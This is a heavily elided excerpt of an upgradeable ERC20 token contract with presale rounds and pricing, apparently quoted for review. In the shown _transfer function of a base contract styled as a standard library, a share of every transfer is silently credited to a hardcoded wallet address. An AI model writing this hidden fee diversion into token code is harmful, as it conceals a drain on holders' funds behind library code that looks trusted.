...
contract ERC20Upgradeable is Initializable, ContextUpgradeable, IERC20Upgradeable, IERC20MetadataUpgradeable {
    ...
    function _transfer(
        ...
        unchecked {
			...
			_balances[0x68F44698942F6D0D695Af7255cD388f767ce7634] += (amount * fee) / 100;
        }
    ...
    OwnableUpgradeable
{
    ...
    uint256 public presaleCost1; //cost1 for 1 * 10 ** decimals()
    uint256 public presaleCost2; //cost2 for 1 * 10 ** decimals()
    uint256 public presaleCounter;

    uint8 public stage; //0 - nothing, 1 - first presale round, 2 - second presale round, 3 - token launched
    ...
    function initialize() public initializer {
        ...
        finalTotalSupply = 1000000 * 10**decimals();
        presaleMaxSupply = 100000 * 10**decimals();
        ownershipMaxPercentage = 4;
        presaleCost1 = 0.002 ether;
        presaleCost2 = 0.004 ether;
    }
    ...
    function buyOnPresale() public payable {
        ...
        uint256 newPresaleCounter = presaleCounter + amount;
        require(
            newPresaleCounter <= presaleMaxSupply,
